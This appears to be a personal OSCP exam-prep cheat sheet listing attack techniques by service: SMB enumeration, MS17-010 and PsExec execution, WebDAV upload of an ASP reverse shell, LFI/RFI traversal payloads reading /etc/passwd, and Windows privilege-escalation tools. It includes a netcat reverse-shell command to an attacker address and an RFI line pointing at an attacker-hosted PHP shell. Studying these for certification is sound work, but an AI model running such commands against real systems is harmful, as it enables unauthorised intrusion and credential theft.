# OSCP Services and Things-To-Try

## Services

__SSH (22)__
* Fingerprint server/OS, SSH key
* Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su root`

__HTTP (80|8080)__
* Curl for HTTP header

__Telnet (23)__
* Stuff

__SMTP (25)__
* Stuff

__SMB / NETBIOS / SMBD (135-139 - 445)__

SMB enumeration
```bash
$ nmblookup -A target
$ smbclient //MOUNT/share -I target -N
$ rpcclient -U "" target
$ enum4linux target        // enum info from Windows and Samba hosts 

# Find named pipes
`msfconsole> use auxiliary/scanner/smb/pipe_auditor`
```

Accessing shared dirs: `smbclient \\\\10.11.1.75\\Users`
* `smb:\> put src_file remote_file`
* `smb:\> get remote_file`
* Put nc.exe => reverse shell
* Get password files => access via. ssh/ rdp

MS17-010 Code Exec
* `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
* `runas`
* `nc.exe 10.11.0.42 443 -e cmd.exe`
* Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

Privesc
* Mount shared drives: `net use z: \\10.11.1.49\Users /user:alice aliceishere`

Exploits:
* [MS08-067] NetAPI module in Windows SMB
* [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
* [MS17-010 ALTERNATIVE METHOD]: Adding new admin account https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

__SMBD / SAMBA (139)__
* SMBD/Sambda is a server to provide SMB service to clients
* Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7

__MSRPC (135)__
* Stuff

## Web

ColdFusion vulns
* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/

WEBDAV vulns - using tools . 
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
```bash
$ davtest -url 10.11..113                                 # test for webdav vulns
$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
          -uploadfile rshell.asp -uploadloc rshell.html
$ cadaver
dav:!> open 10.11.1.13                                    # open connection to URL
dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
```

WEBDAV vulns - manual
```bash
$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
```

Apache
* Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout

LFI / RFI
(LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
```
# Append NULL bytes (prevent .ext concat to the end by application)
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=../../../etc/passwd%en
http://example.com/index.php?page=../../../etc/passwd%00%en
```

PHP
* Check `phpinfo()`
* RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions

## Privesc - LINUX

UDEV
* Guide: http://www.madirish.net/370
* Exploit Code: https://www.exploit-db.com/exploits/8478

## Privesc - WINDOWS

Accesschk.exe:
* http://www.fuzzysecurity.com/tutorials/16.html
```
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

Psexec.exe:
* https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Net Use:
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15


## Reverse Shell Tips

Reverse shell cheatsheet: http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/

If reverse shell hangs / dies, try a different port.
* A firewall may be blocking / disconnecting you on the port.
* E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).


## Metasploit

Msfvenom commands:
* https://netsec.ws/?p=331




